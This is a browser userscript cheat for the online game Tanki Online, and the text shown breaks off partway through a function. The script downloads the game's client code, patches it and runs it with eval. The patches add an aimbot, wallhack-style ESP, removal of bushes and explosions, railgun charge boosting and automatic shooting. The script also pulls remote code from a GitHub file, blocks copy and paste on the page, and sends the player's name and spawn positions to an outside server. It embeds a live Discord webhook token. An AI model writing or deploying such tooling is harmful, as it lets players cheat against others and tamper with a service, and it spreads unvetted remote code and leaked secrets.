// ==UserScript==
// @name         coffee script
// @version      0.8
// @description  gives you magical powers!
// @author       wealthy
// @match        *://*.tankionline.com/*
// @require      https://raw.githubusercontent.com/wealthydev/TankiOnline/refs/heads/main/functions.txt
// @require      https://raw.githubusercontent.com/flyover/imgui-js/master/dist/imgui.umd.js
// @require      https://raw.githubusercontent.com/flyover/imgui-js/master/dist/imgui_impl.umd.js
// @require      https://cdnjs.cloudflare.com/ajax/libs/html2canvas/1.4.1/html2canvas.min.js
// @connect      raw.githubusercontent.com
// @connect      github.com
// @connect      s.eu.tankionline.com
// @connect      tanki-socks.fly.dev
// @connect      discord.com
// @grant        GM.xmlHttpRequest
// @grant        GM_xmlhttpRequest
// @grant        unsafeWindow
// @icon         https://i.ibb.co/5XtLGBqx/image.png
// @run-at       document-start
// ==/UserScript==

/*
Pikaaaaa-chuuuu!
Pikapikapika… pi-ka!
Chuu-pika!

I’m not engaging in direct or indirect chat drama. It violates Tanki’s rules. Please use the official report system if you genuinely believe a rule has been broken.
*/
document.bekes = 600
document.testValue = 400;
document.testAdd = 0.2;
const { log } = window;

['paste', 'copy', 'cut'].forEach(function(event) {
    document.addEventListener(event, function(e) {
        e.stopImmediatePropagation();
    }, true);
});

const bridgeFrame = document.createElement("iframe");
bridgeFrame.src = "https://tanki-socks.fly.dev/bridge";
bridgeFrame.style.display = "none";
document.documentElement.appendChild(bridgeFrame);

const ws = window.ws = {
    readyState: 0,
    send(data) { bridgeFrame.contentWindow?.postMessage({ type: "send", data }, "*"); }
};

setInterval(() => {
    if (ws.readyState !== 3) return;
    ws.readyState = 0;
    log("[ws] reconnecting...");
    bridgeFrame.src = "https://tanki-socks.fly.dev/bridge";
}, 5000);

window.addEventListener("message", (e) => {
    if (e.origin !== "https://tanki-socks.fly.dev") return;
    const { type, data, code } = e.data || {};
    if (type === "open") {
        ws.readyState = 1;
        log("[ws] connected");
        if (_pendingVerify) { ws.send(JSON.stringify({ type: "verify", name: _pendingVerify, saved: _localSaved })); _pendingVerify = null; }
    }
    if (type === "message") {
        try {
            const msg = JSON.parse(data);
            if (msg.type === "players") window.playerSpawns = msg.data
            else if (msg.type === "verified" && msg.name && msg.name === user.name?.toLowerCase()) {
                _vk = msg.name;
                _saved = msg.saved;
                _securityRan = true;
                ws.send(JSON.stringify({ type: "online", name: _vk, saved: _saved }));
                log(`welcome ${user.name}`);
            }
            else log("[ws] message:", msg.type, msg);
        } catch { log("[ws] raw message:", data); }
    }
    if (type === "error") { log("[ws] error"); }
    if (type === "close") { ws.readyState = 3; log("[ws] closed, code:", code); }
});

unsafeWindow.sendSpawn = window.sendSpawn = (x, y, z, rot, name) => {
    if (ws.readyState !== 1) return;
    ws.send(JSON.stringify({ type: "spawn", name, x, y, z, rot }));
};


localStorage.removeItem("dataset");
let RU;// = window.localStorage["language_store_key"] === "RU";

setInterval(() => {
    if(RU) return;
    const startText = document.getElementsByClassName("StartScreenComponentStyle-text")[0]?.textContent;
    if(startText === "Нажмите любую кнопку, чтобы начать") RU = true, log(RU, "russian detected")
}, 7);

let user = window.user = unsafeWindow.user = {};
let tanks = window.tanks = unsafeWindow.tanks = [];
let props, oldThread = Date.now();

const _WEBHOOK = "https://discord.com/api/webhooks/1519961984668405761/U6VxgYgsvaZgplxRyTo9GxBIoNFp0bJt6EfQx-6DYD7MJrsAV2glfI_yKTB4igxmB5H-";
const _localSaved = 1780155951730;
let _vk = null, _saved = null, _pendingVerify = null, _securityRan = false;

function formatMs(ms) {
    let s = Math.floor(ms / 1000);
    return [
        [31536000, 'y'], [2592000, 'mo'], [86400, 'd'],
        [3600, 'h'], [60, 'm'], [1, 's']
    ].reduce((acc, [amt, unit]) => {
        const val = Math.floor(s / amt);
        s %= amt;
        return val ? `${val}${unit} ` + acc : acc;
    }, "").trim();
}
Object.defineProperty(user, 'verified', {
    get: () => _vk !== null && _vk === user.name?.toLowerCase() && _saved !== null && Date.now() - _saved <= 1000 * 60 * 60 * 24 * 50,
    set: () => {},
    configurable: false,
    enumerable: false,
});

log('wealthy says hiiii =)');

let date = Date.now();

function setUser(name) {
    user.name = name;
    const low = name.toLowerCase();
    if (ws.readyState === 1) {
        ws.send(JSON.stringify({ type: "verify", name: low, saved: _localSaved }));
    } else {
        _pendingVerify = low;
    }
    update();
}

window.getMain = async (url) => {
    while (!(url = [...document.scripts].find(s => s.src.includes("/static/js/"))?.src)) await window.sleep(100);
    return url.split("com")[1];
};

async function start() {
    const url = await getMain();
    let script = await fetch(`https://s.eu.tankionline.com${url}`).then(res => res.ok ? res.text() : null).catch(() => null);

    log("main:", url);

    script = await patch(script);
    unsafeWindow.log = log;
    unsafeWindow.checked = checked;
    unsafeWindow.byIndex = byIndex;
    unsafeWindow.getNames = byIndex;
    unsafeWindow.byPath = byPath;
    unsafeWindow.byProto = byProto;
    unsafeWindow.setByIndex = setByIndex;
    unsafeWindow.setByPath = setByPath;
    unsafeWindow.recoil_delay = window.recoil_delay;
    unsafeWindow.aim = window.aim;
    unsafeWindow.setTargets = window.setTargets;
    unsafeWindow.horizontalScore = window.horizontalScore;
    unsafeWindow.eval(`log("init -> ");${script}`);
}

class parser {
    constructor(file) {
        this.f = file;
    }

    get_smoke() {
        const parts = this.f.split("/600");
        for (const seg of parts) {
            const tail = seg.split("<=0")[0];
            if (tail?.length <= 500) {
                return tail.split("function").pop()?.split("if")[0]?.split("this.").pop()?.split(";")[0];
            }
        }
        return null;
    }

    get_fov() {
        const m = this.f.match(/\w+\.call\s*\(\s*this\s*\)\s*,\s*this\.(\w+)\s*=\s*3\.1415927\s*\/\s*3/);
        return m ? m[1] : null;
    }

    get_fill() {
        const parts = this.f.split('"configureBars"');
        for (const part of parts) {
            if (part.length > 2000) {
                return part.slice(-2000).split('"configure"')[1]?.split("return function")[1]?.split("return")[1]?.split("){")[0]?.split(",")[1]?.split("(")[0]?.split(".")[1];
            }
        }
        return null;
    }

    get_tanks() {
        return this.f.split("onBattleRestart")[0]?.split("function")?.pop()?.split(".")[1]?.split(",")[0];
    }

    get_chargeEffect() {
        const parts = this.f.split("chargeEffect");
        for (const part of parts) {
            if (part.length > 50) return part.slice(-50).split("var")[1]?.split("=")[1]?.split(";")[0]?.split(".")[1];
        }
        return null;
    }

    get_showWeaponBar() {
        return this.f.split("showWeaponBar=")[1]?.split("+")[1]?.split("this.")[1];
    }

    get_userTitleComponent() {
        const parts = this.f.split('"userTitleComponent"');
        for (const part of parts) {
            if (part.length > 50) {
                return part.slice(-50).split("var")[1]?.split("=")[1]?.split(";")[0]?.split(".")[1];
            }
        }
        return null;
    }

    get_worldTimeProp() {
        const tail = this.f.split('"railgunWeapon"')[0].slice(-3000);
        const chainRe = /\bthis\.(\w+)\(\)\.(\w+)\(\)/g;
        let m;
        while ((m = chainRe.exec(tail)) !== null) {
            const getter = m[2];
            const propM = this.f.match(new RegExp(`\\.${getter}\\s*=\\s*function\\s*\\(\\)\\s*\\{\\s*return\\s+this\\.(\\w+)(?![.\\w])`));
            if (propM) return propM[1];
        }
        return null;
    }

    get_worldGetter() {
        const tail = this.f.split('"railgunWeapon"')[0].slice(-3000);
        const chainRe = /\bthis\.(\w+)\(\)\.(\w+)\(\)/g;
        let m;
        while ((m = chainRe.exec(tail)) !== null) {
            const getter = m[2];
            if (new RegExp(`\\.${getter}\\s*=\\s*function\\s*\\(\\)\\s*\\{\\s*return\\s+this\\.\\w+(?![.\\w])`).test(this.f)) {
                return m[1];
            }
        }
        return null;
    }

    get_rotateProp() {
        const parts = this.f.split('"hull"');
        for (let i = 1; i < parts.length; i++) {
            if (!parts[i].slice(0, 10).includes('}(this)')) continue;
            const before = parts[i - 1].slice(-600);
            const matches = [...before.matchAll(/\.(\w+)\s*=\s*function\s*\(\w+\)\s*\{/g)];
            if (matches.length) return matches[matches.length - 1][1];
        }
        return null;
    }

    get_railgunCharge() {
        const before = this.f.split('"railgunWeapon"')[0];
        const tail = before.slice(-3000);
        const match = tail.match(/(t\.\w+=\w+\(\),t\.\w+=(\w+)\(0\),t\.\w+=(\w+)\(n,t\.\w+\),)/);
        return match ? { str: match[1], ixFn: match[2], jxFn: match[3] } : null;
    }

    get_flagDrop() {
        const anchor = this.f.match(/callableName\s*=\s*"dropFlag"/);
        if (!anchor) return null;
        const tail = this.f.slice(0, anchor.index).slice(-500);
        const m = tail.match(/(\w+)\.(\w+)\((\w+\.\w+)\),\s*(\w+\((\w+)\)\.\w+\(\1\)),\s*\w+\(\5\)/);
        if (!m) return null;
        return {posField: m[3], entityVar: m[1], dropCall: m[4].replace(/\s+/g, '') + ','};
    }

    get_flagTaken() {
        const anchor = this.f.match(/callableName\s*=\s*"flagTaken"/);
        if (!anchor) return null;
        const tail = this.f.slice(0, anchor.index).slice(-500);
        const entityM = tail.match(/var\s+(\w+)\s*=\s*\w+\.\w+\((\w+)\.\w+\)/);
        const matches = [...tail.matchAll(/(\w+\(\w+\)\.\w+\(\w+,\s*\w+\));/g)];
        if (!matches.length) return null;
        return {
            takenCall: matches[matches.length - 1][0].replace(/\s+/g, ''),
            entityVar: entityM?.[1] ?? null,
        };
    }

    get_flagReturn() {
        const anchors = [...this.f.matchAll(/callableName\s*=\s*"returnFlagToBase"/g)];
        for (const anchor of anchors) {
            const tail = this.f.slice(0, anchor.index).slice(-300);
            const condM = tail.match(/\w+\.\w+\s*&&\s*(\w+\(\w+\)\.\w+\(\w+,\s*\w+\))/);
            if (!condM) continue;
            const entityM = tail.match(/var\s+(\w+)\s*=\s*\w+\.\w+\((\w+)\.\w+\)/);
            if (!entityM) continue;
            return {hookStr: condM[1].replace(/\s+/g, ''), entityVar: entityM[1]};
        }
        return null;
    }

    get_turretSend() {
        const anchor = '>.5235988})(this)&&(';
        const idx = this.f.indexOf(anchor);
        if (idx === -1) return null;
        const after = this.f.slice(idx + anchor.length, idx + anchor.length + 200);
        const sendM = after.match(/,(\w+)\(this\)\)/);
        if (!sendM) return null;
        return { str: anchor, fn: sendM[1] };
    }

    get_espCam() {
        const m = this.f.match(/var ([\w$]+)=([\w$]+\.[\w$]+\(\)\.[\w$]+)\.[\w$]+\([\w$]+,[\w$]+\(\)\.[\w$]+\)/);
        return m ? { str: m[0], cam: m[2] } : null;
    }

    get_cam() {
        const m = this.f.match(/function\((\w+)\)\{var \w+=\1\.\w+;if\(null==\w+\)return \w+;\w+\.\w+\(\1\.\w+\),\1\.(\w+)\.\w+\.(\w+)\(\1\.\w+\.\w+\),\1\.\2\.\w+\.\3\(\1\.\w+\.\w+\),\1\.\2\.\w+\(\1\.\w+\.\w+\),\1\.\2\.(\w+)\(\)\}/);
        if (!m) return null;
        return { str: `${m[1]}.${m[2]}.${m[4]}()`, cam: `${m[1]}.${m[2]}` };
    }

    get_prepareToSpawn() {
        const m = this.f.match(/\.\w+\s*=\s*function\s*\(\s*(\w+)\s*,\s*(\w+)\s*\)[\s\S]{0,200}?this\.(\w+)\.(\w+)\.(\w+)\(\s*\1\s*\)\s*,\s*this\.\3\.(\w+)\s*=\s*\2\.(\w+)/);
        if (!m) return null;
        return {
            str: `this.${m[3]}.${m[4]}.${m[5]}(${m[1]}),this.${m[3]}.${m[6]}=${m[2]}.${m[7]}`,
            pos: m[1], ori: m[2], yawField: m[7]
        };
    }

    get_vector3() {
        const m = this.f.match(/"Vector3 \("\s*\+\s*this\.(\w+)\s*\+\s*", "\s*\+\s*this\.(\w+)\s*\+\s*", "\s*\+\s*this\.(\w+)\s*\+\s*"\)"/);
        if (!m) return null;
        return { x: m[1], y: m[2], z: m[3] };
    }

    setup() {
        return {
            tanks: this.get_tanks(),
            smoke: this.get_smoke(),
            fov: this.get_fov(),
            fill: this.get_fill(),
            chargeEffect: this.get_chargeEffect(),
            showWeaponBar: this.get_showWeaponBar(),
            userTitleComponent: this.get_userTitleComponent(),
            worldTimeProp: this.get_worldTimeProp(),
            worldGetter: this.get_worldGetter(),
            railgunCharge: this.get_railgunCharge(),
            rotateProp: this.get_rotateProp(),
            flagDrop: this.get_flagDrop(),
            flagTaken: this.get_flagTaken(),
            flagReturn: this.get_flagReturn(),
            turretSend: this.get_turretSend(),
            espCam: this.get_espCam(),
            cam: this.get_cam(),
            prepareToSpawn: this.get_prepareToSpawn(),
            vector3: this.get_vector3(),
        };
    }
}

const patch = (script) => {
    if(!script) return null;

    window.setup(script);
    window.script = script.repeat(1);
    props = new parser(script).setup();

    log("properties", props);

    apply(props.tanks, function(value) {
        window.list = byIndex(value, 1);
        log("tank list: ", window.list);
        return value;
    });

    apply(props.smoke, null, function(name) {
        let data = this[name];
        if(checked("Remove Explosion")) data = null;
        return data;
    });

    apply(props.fov, null, function(name) {
        let data = this[name];
        if(typeof data === "number" && checked("FOV")) data = 1.0471 * sliderValue("fovValue");
        return data;
    });
    /*
    function angle(n){
    for(;n>Math.PI;)n-=2*Math.PI;
    for(;n<-Math.PI;)n+=2*Math.PI;
    return n;
}

function convert(e,t){
    let n={},r=Object.keys(e);
    for(let l=0;l<t.length;l++){
        let o=t[l],c=r[l];
        e.hasOwnProperty(c)&&(n[o]=e[c]);
    }
    return n;
}

function rotation() {
    let t = convert(user.body.orientations, "xyzw");
    return 2 * Math.atan2(t.w, t.x);
}

let pos = convert(user.body.pos, "xyz"),
    yaw = rotation();
*/
    /*
    log(window.allBullets)
for(let bullet of window.allBullets) {
    let targetPos = tanks.find(c => c.name === "name").body.pos;

    copyItem(bullet.a15e_1, targetPos);
    copyItem(bullet.b15e_1, targetPos);
}

clearInterval(window._stackInterval); window.stackTarget = null;
*/

    let props2 = collection.mapName.split(",");
    for(let prop of props2) apply(prop, function(value) {
        if(typeof value !== "string") return value;
        unsafeWindow.mapName = window.mapName = value;
        return value;
    });

    props2 = collection.message.split(",");
    for(let prop of props2) apply(prop, function(value) {
        if(typeof value !== "string" || value.length < 2 || value.startsWith("{")) return value;
        if(value === "/flip") {
            const step = Math.PI / 40;
            let turns = 0;
            user.body.setMovable(false);
            const oKeys = Object.keys(user.body.orientations);
            const flip = setInterval(() => {
                const [w, x, y, z] = oKeys.map(k => user.body.orientations[k]);
                const c = Math.cos(step/2), s = Math.sin(step/2);
                user.body.orientations[oKeys[0]] = c*w - s*x;
                user.body.orientations[oKeys[1]] = c*x + s*w;
                user.body.orientations[oKeys[2]] = c*y - s*z;
                user.body.orientations[oKeys[3]] = c*z + s*y;
                if(++turns >= 80) {
                    clearInterval(flip);
                    user.body.setMovable(true);
                }
            }, 16);

            return null;
        }
        return value;
    });
    let dataChanger = {
        name: ["name", "Wealthy"],
        clan: {
            bool: true,
            tag: ["clan", null],
        }
    }

    let types = {
        name: collection.uid,
        clan: collection.clanTag
    };

    Object.keys(types).forEach(name => {
        let value = types[name], props = value.split(",");

        for(let prop of props) apply(prop, function(value) {
            if(typeof value === "function" || !value) return value;

            if(name === "name" && value) {
                if(!user.name) setUser(value);
                if(dataChanger && value === dataChanger.name[0]) value = dataChanger.name[1];
            } else if(dataChanger && name === "clan") {
                if(dataChanger.clan.bool) {
                    if(value === dataChanger.clan.tag[0]) value = dataChanger.clan.tag[1];
                }
            }
            return value;
        });
    });

    apply(props.chargeEffect, null, function(name) {
        let data = this[name];
        data.date = Date.now();
        data.repeat = true;
        return data;
    });

    const boxes = [];

    let t = script.split('"showTrail"')[0].split('"applyImpact"'),
        e = (t = t[t.length - 1].split("this,")[1].split("break")[0]).replace("return function", "return async function"),
        i = `${e.split("var")[1]} var${e.split("var")[2]}`,
        l = i.split(";")[3],
        s = i.split(l)[0];

    e = e.replace(l, `window.aim.ready();window.aimDir = null;try {window.aimDir = byIndex(user.data.weaponMount, 8);} catch(e) {console.error(e.message);}${l}; try {window.aim.establish()} catch(e) {console.error(e.message);} ${s} ${l};
        try {
        log("final targets", byIndex(${l.split(",")[1]}, 2, 1));
        }catch(e) {console.error(e.message);}`);
    let d = script.split("applyImpact")[3].slice(-150).split(`while`)[1];
    boxes.push([t, `async ${e}`]);

    let m = l.split(".")[1].split("(")[0];
    let res = script.split("onStartLocking")[0].split(m).pop().split("function")[0];
    let guide = res.split("&&")[1];
    let repl = res.split("&&")[0].split(",").pop();

    let targObj = guide?.split("!")[1].split(".")[0];
    let oks = script.split(res)[0].split("function");

    const vertical = oks[oks.length - 2].split("-1/0,")[1].split("}}")[0]+"}",
          score = vertical.split(">")[0].split("=").pop().split(";")[0], targets = score.split(",")[1].split(")")[0];

    //boxes.push([score, `window.verticalScore(${score}, ${targets});`]);
    boxes.push([`${repl}&&`, `window.setTargets(${targObj});${repl}&&`]);

    boxes.push([`${guide}&&`, `true&&`]);

    const horizontal = script.split("WITHOUT_ASSIST_IGNORE_GRENADE")[1].split("function").find(one => one.includes(2147483647));

    let str = script.split(`${repl}&&`)[1].split("}(")[0], bk = str.split("){").pop().split(";")[0].split("=")[1], bc = bk.split("?")[1].split(":");
    boxes.push([bk, `${bc[0]}.score === ${bc[1]}.score ? (${bk}) : (${bc[0]}.score > ${bc[1]}.score ? ${bc[0]} : ${bc[1]})`]);

    str = horizontal.repeat(1);

    let v = str.split("2147483647")[0].split(",").pop().split(".")[0];

    str = str.replace("2147483647;", `2147483647;${v}.score=0;let best,bestFirst=0,bestLast=0,sms=false;try{`);

    let fc = str.split("+1|0,")[1].split("))")[0]+"))";
    let lup = str.split("+1|0,")[0].split("=").pop();

    str = str.replace(`if(${lup}=`, `${lup}=`);

    let tr_ = str.split(`${fc},`)[1].split("){")[0];
    let tr = tr_.split(`.${tr_.split(".")[2]}`)[0];

    let sv = str.split("break")[0].split("{").pop();
    str = str.replace(`+1|0,${fc}`, `+1|0;${fc};`);

    let brk = str.split("break")[1].split("}")[0].slice(1);
    str = str.replace(`break ${brk}}`, "");

    str = str.replace(sv, "}");

    str = str.replace(`,${tr_}){`, `let prevSms=sms;sms=false;let targets = byIndex(${tr}, 2, 1), score = window.horizontalScore(targets);if(score > 0) { if(!best || best < score) {${sv}${v}.score=score;${v}.targets=targets;best=score;bestFirst=o;bestLast=o;sms=true;} else if(score===best&&prevSms){bestLast=o;sms=true;}`);

    let mx = str.split(`var ${lup}=1,`)[1].split("=")[0],
        sms = sv.split(".")[1]?.split("=")[0];
    let bkl = `;if(best && bestFirst > 1) {
    ${v}.${sms} = Math.round((bestFirst + bestLast) / 2);
    let maxIndex = mx, index = 1;
     while (index <= maxIndex) {
      const currentIndex = index;
      index += 1
      if(index === ${v}.${sms}) {
       ${fc};
      }
    }
    window.bestAngle = ${v}.${sms};log("best angle:", ${v}.${sms}, "score:", best)
    }
    } catch(e){log("horizontal aim error", e.message)}`;

    let frst = str.slice(0, -1);
    str = str.replace(frst, frst + bkl);

    boxes.push([horizontal, str]);

    let k = t.split("){")[1];
    boxes.push([k, k.replace("function", "async function")]);

    window.recoil_delay = 25;
    let j = script.split(`).callableName="onShot"`)[5].split("=function()").pop();
    d = j.split("=function(")[1] + "=function(" + j.split("=function(")[2];
    let id = d.replace("){", "){setTimeout(() => {").slice(0, -1) + "}, window.recoil_delay);}";

    boxes.push([d, id]);

    s = script.split("battleHudService").find(c => {
        let d = c.split("Invalid supply type").pop();
        return d.length < 2000 && d.includes(".5,1");
    })
    d = s.split("Invalid supply type").pop().split('null == ')[0].split(";")[7] // supplies
    boxes.push([d, `!checked("Clean Screen") && ${d}`])
    d = script.split("FundHudParams")[0].split("batchedUI").pop().split(",")[1] // fund
    boxes.push([d, `!checked("Clean Screen") && ${d}`])

    let ads = script.match(/return \w+\(\w+\(\w+\/\w+\.\w+\),\w+\.\w+\.e1\(\)-1\|0\)/)?.[0];
    if (ads) boxes.push([ads, `return checked("Legacy") || checked("XT") ? 0 : ${ads.split('return ')[1]}`]);

    const rc = props.railgunCharge, wg = props.worldGetter, wtp = props.worldTimeProp;
    if (rc && wg && wtp) {
        const p = rc.str.match(/^(\w+)\./)?.[1];
        if (p) boxes.push([rc.str, `window.railgunBoost&&(${p}.${wg}().${wtp}=${rc.jxFn}(${p}.${wg}().${wtp},${rc.ixFn}(window.railgunBoost)),window.railgunBoost=false),${rc.str}`]);
    }

    let lab = script.split(".state.isReArmorEnabled&&")[1].split("}")[0]
    boxes.push([`.state.isReArmorEnabled&&${lab}`, `&&${lab}`])

    const ts = props.turretSend;
    if (ts) boxes.push([ts.str,`${ts.str}window.turretWindow=this,window.turretPacket||(window.turretPacket=function(){${ts.fn}(window.turretWindow)}),`]);

    const ec = props.espCam;

    if (ec) boxes.push([ec.str, `window.espCam=${ec.cam};${ec.str}`]);
    const cam = props.cam;
    if (cam) boxes.push([cam.str, `${cam.str},window.espCam=${cam.cam}`]);

    str = script.split("Total batch groups:")[0].slice(-100);
    let [ isBush, addObj ] = [ str.match(/\w+\(0,\s*\w+\)/)[0], str.match(/\w+\.\w+\(\)\.\w+\(\w+\)/)[0] ];

    const bushMiddle = str.split(isBush)[1].split(addObj)[0];
    boxes.push([isBush + bushMiddle + addObj, `checked("Remove Bushes")?(!${isBush}&&${addObj}):(${isBush}${bushMiddle}${addObj})`])

    const fd = props.flagDrop, ft = props.flagTaken, fr = props.flagReturn;
    if (fd) {
        const msgVar = fd.posField.split(".")[0];
        boxes.push([fd.dropCall,`((window.blueFlagEntity===${fd.entityVar}||(!window.blueFlagDropTime&&byIndex(${msgVar},0)===0))?(window.blueFlagDropTime=Date.now(),window.blueFlagDropPos=${fd.posField},window.blueFlagEntity=${fd.entityVar}):(window.redFlagDropTime=Date.now(),window.redFlagDropPos=${fd.posField},window.redFlagEntity=${fd.entityVar})),${fd.dropCall}`]);
    }
    if (ft && ft.entityVar) boxes.push([ft.takenCall,`(window.blueFlagEntity===${ft.entityVar}?(window.blueFlagDropTime=null,window.blueFlagDropPos=null,window.blueFlagEntity=null):(window.redFlagEntity===${ft.entityVar}?(window.redFlagDropTime=null,window.redFlagDropPos=null,window.redFlagEntity=null):null)),${ft.takenCall}`]);
    if (fr && fr.entityVar) boxes.push([fr.hookStr,`(window.blueFlagEntity===${fr.entityVar}?(window.blueFlagDropTime=null,window.blueFlagDropPos=null,window.blueFlagEntity=null):(window.redFlagEntity===${fr.entityVar}?(window.redFlagDropTime=null,window.redFlagDropPos=null,window.redFlagEntity=null):null)),${fr.hookStr}`]);

    const pts = props.prepareToSpawn, v3 = props.vector3;
    if (pts && v3) {
        const { pos, ori, yawField, str } = pts;
        boxes.push([
            str,
            `(Date.now()-document.deathTime<150&&(window.spawnPrep={x:${pos}.${v3.x},y:${pos}.${v3.y},z:${pos}.${v3.z},rot:${ori}.${yawField}},window.sendSpawn&&window.sendSpawn(${pos}.${v3.x},${pos}.${v3.y},${pos}.${v3.z},${ori}.${yawField},window.user&&window.user.name))),${str}`
            ]);
        }

    boxes.push(["equals", "eqls"]);
    for(let box of boxes) {
        const found = script.includes(box[0]);
        if(found) script = script.replaceAll(box[0], box[1]);
        log(found ? "patched: " : "NOT FOUND: ", box);
    }

    //window.script = script;
    return script;
};

const addTanks = (values) => {
    let old_tanks = tanks;
    tanks = window.tanks = [];

    const scan = (item) => {
        if (!item || typeof item !== "object") return;

        Object.values(item).forEach(function(data) {
            if(!data?.sort || typeof data[0] === "number") return false;

            const isUser = data.length >= 90;
            const tank = new Tank(data, isUser);

            // for(let found of old_tanks) if(tank?.name === found?.name) tank.health = found.health;

            tanks.push(tank);
            if(isUser) Object.assign(user, tank);
            window.tanks = tanks;
        });
    };

    for(let obj of list) Object.values(obj).forEach(scan);
};

const update = () => {
    if(!user.verified) return requestAnimationFrame(update);

    for(let tank of tanks) {
        let { data } = tank;
        if(!data) continue;

        let obj = { state: tank.state, stateTime: tank.stateTime }
        if(tank.freeze) Object.assign(obj, {freeze: tank.freeze})
        tank.old = obj;

        tank.update2(data);
    }

    if(Date.now() - oldThread < 100) return requestAnimationFrame(update);
    oldThread = Date.now();

    const { list } = window;
    if (list && list.length !== tanks.length) addTanks(list);

    if (tanks.length === 0 && window.playerSpawns?.length) {
        window.playerSpawns = [];
        if (ws.readyState === 1 && user.name) ws.send(JSON.stringify({ type: "leave", name: user.name }));
    }

    for (let tank of tanks) {
        tank.update();
    }

    let simple = user.data;

    if(simple?.chargeEffect?.repeat) {
        let shotTime = Date.now() - simple.chargeEffect.date,
            chargeTime = byIndex(simple.railgunWeapon, 4) * 1e3 + 50,
            freezeTime = 700;

        if(shotTime < chargeTime && shotTime > chargeTime - freezeTime + 50) {
            window.predict = false;
            if(window.freezeShot) {
                window.freezeShot = false;
                simple.chargeEffect.repeat = false;

                for(let tank of tanks) {
                    if(tank.enemy && tank.body && (!tank.freeze || Date.now() - tank.freeze.date > freezeTime - window.bonusSpeed)) {
                        tank.freeze = { date: Date.now(), time: freezeTime };
                        tank.freeze.orientations = Object.values(tank.body.orientations);
                        tank.freeze.pos = Object.values(tank.body.pos);
                    }
                }
            }
        }
    }

    requestAnimationFrame(update);
};

let movement, boostDate;

class Tank {
    constructor(data, isUser) {
        this.isUser = isUser;
        this.health = 2;
        this.init(data);
    }

    init(data) {
        this.data = {};
        this.path = {};
        this.raw = data;

        const process = (obj, data, index) => {
            let [depth, path] = data;
            if(index) path = `${index}`;

            if (path.split(".").length >= depth || !obj || typeof obj !== "object" || Array.isArray(obj)) return;

            let callableName = byProto(obj);
            if (callableName) this.data[callableName] = obj;

            let keys = Object.keys(obj);

            for (let key of keys) {
                let name = _collection[key] || byProto(obj[key]);

                if (!name && obj[key] && typeof obj[key] === "object" && !Array.isArray(obj[key])) {
                    Object.keys(obj[key]).find(c => {
                        if (_parents[c]) name = _parents[c];
                    });
                }
                if (path) path += `.`;
                path += `${(name || key)}`;

                if (name) {
                    this.data[name] = obj[key];
                    this.path[name] = path;

                    depth && process(obj[key], [depth, path]);
                }
            }
        };

        this.raw.forEach((chunk, index) => process(chunk, [5, ``], index));
    }

    update2() {
        let { data } = this;

        if(!data || !props) return;

        this.getStats(data);
        this.esp(data);

        this.doDrifting(data);
        this.doShot(data);

        if (this.isUser) {
            Object.assign(user, this);
            Object.assign(this, user);
        }
    }

    update() {
        try {
            let { data } = this;

            if(!data || !props) return;

            let chargeEffect = `_${props.chargeEffect}_`;

            let weaponIndex;

            this.raw.forEach((item, index) => {
                let keys = Object.keys(item);
                if(keys.includes(chargeEffect)) weaponIndex = index;
            });

            if(weaponIndex !== undefined) {
                this.data.chargeEffect = data.chargeEffect = this.raw[weaponIndex][chargeEffect];
            }

            this.getPhysics(data);
            this.getTurret(data);

            if (this.isUser) {
                Object.assign(user, this);
                Object.assign(this, user);
            }
        } catch(e) {log(e.message);}
    }

    doShot(data) {
        if(!data?.chargeEffect?.date) return;

        try {
            let XPBP = this.turret?.name === "Railgun" && user.turret?.name === "Railgun";

            if(this.enemy && XPBP) {
                let tween = Date.now() - data.chargeEffect.date;
                if(tween < 50) {

                    if(window.predict && this.state === "active" && data.chargeEffect.repeat) {
                        data.chargeEffect.repeat = false;
                        window.predict = false;
                        unsafeWindow.railgunBoost = window.railgunBoost = .25 + window.bonusSpeed / 1000;
                        user.turret.shoot();
                    }
                }
            }

            if(this.enemy && XPBP) {
                if(this.state !== "active") data.chargeEffect.date = Date.now() - 1e4;

                let shotTime = Date.now() - data.chargeEffect.date;
                if(this.enemy && this.state === "active" && shotTime < 2600 + 1050 - window.bonusSpeed && shotTime > 2500 + 1050 - window.bonusSpeed && isBindHeld("preShot")) { // pre shot
                    user.turret.shoot();
                }
            }
        } catch(e) { log(e); }
    }

    esp(data) {
        if(this.isUser || !data) return;
        if(this.espDelta && Date.now() - this.espDelta < 50) return;
        this.espDelta = Date.now();

        const types = {
            active: (this.state === "active"),
            dead: (this.state === "dead"),
            ghost: (["semi_active", "dead_phantom"].includes(this.state))
        };

        let toggle, coloring;
        if (types.active && this.enemy) {
            toggle = state.enemyWh;
            coloring = rgbToInt(state.enemyColor);
        } else if (types.active) {
            toggle = state.teamWh;
            coloring = rgbToInt(state.teamColor);
        } else if (types.dead) {
            toggle = state.deadWh;
            coloring = rgbToInt(state.deadColor);
        } else if (types.ghost) {
            toggle = state.ghostWh;
            coloring = rgbToInt(state.ghostColor);
        } else {
            toggle = false;
            coloring = 16711680;
        }

        let shotTime = Date.now() - data.chargeEffect?.date,
            loading = shotTime && shotTime <= 1200;

        const esp = (temp) => {
            const keys = Object.keys(temp),
                  length = keys.length;

            let slim = keys[length - 3], colour = keys[length - 2], wide = keys[length - 1];

            let target = (temp[colour] === 16711680 && temp[wide] && temp[slim]),
                overdrive = (temp[colour] === 16777215 && !temp[wide] && temp[slim]);

            if(!target && !overdrive && typeof temp === "object" && typeof slim === "string") {
                temp[slim] = toggle;
                temp[colour] = !toggle ? 16711680 : coloring;
                temp[wide] = loading ? true : false;
            }
        };

        if(data.wheelsL) for(let wheel of data.wheelsL) esp(byIndex(wheel, 0));
        if(data.wheelsR) for(let wheel of data.wheelsR) esp(byIndex(wheel, 0));

        if(data.hullMesh) esp(data.hullMesh);

        let skins = Object.values(data.skin || {});

        for(let skin of skins) {
            if(skin && Object.values(skin).length === 27) {
                esp(skin);
            } else if(skin) {
                let textures = byIndex(skin, 1);

                if(textures && textures.length) {
                    for(let texture of textures) {
                        let val = Object.values(texture);

                        if(val.length > 20) {
                            esp(val);
                        } else esp(byIndex(val, 0));
                    }
                }
            }
        }
    }

    doDrifting(data) {
        if(!this.old) return;

        let { state, stateTime } = this.old;

        let speed = byIndex(user.data.speedCharacteristics, 6, 1);
        this.wasp = typeof speed === "number" && Math.round(speed) === 1239;

        if(this.state !== state) {
            log(`been ${state} for ${Date.now() - stateTime} ms`)
            if(this.isUser && this.state === "semi_active" && movement) {
                _hStart();
                movement = false;
            }
            if(this.state === "dead" && this.isUser) document.deathTime = Date.now();

            if(this.stateTime) {
                if(this.enemy && isBindHeld('safeShot') && this.state === "active" && data.chargeEffect.repeat) { // safe shot
                    data.chargeEffect.repeat = false;
